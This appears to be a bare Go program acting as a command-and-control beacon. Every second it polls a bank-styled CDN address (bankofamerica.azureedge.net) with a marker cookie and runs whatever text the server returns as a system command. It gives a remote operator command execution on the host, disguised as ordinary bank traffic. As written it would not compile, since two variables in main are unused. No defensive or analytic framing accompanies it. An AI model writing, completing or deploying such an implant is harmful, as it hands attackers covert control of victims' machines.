package main

import "fmt"
import "net/http"
import "io"
import "time"
import "os/exec"

var url = "https://bankofamerica.azureedge.net"

func Get() string{
	client  := &http.Client{}

	req, err := http.NewRequest("GET", url, nil)
	if(err != nil){
		return "NOP"
	}

	cookie := &http.Cookie{Name: "FrequentFlyerAgent"}
	req.AddCookie(cookie)

	resp, err := client.Do(req)
	if err != nil {
		return "NOP"
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)

	return string(body)
}

func main(){

	for true{
		response := Get()
		if(response != "NOP"){
			fmt.Println(response)
			out, err := exec.Command(response).Output()
		}
		time.Sleep(1 * time.Second)
	}
}
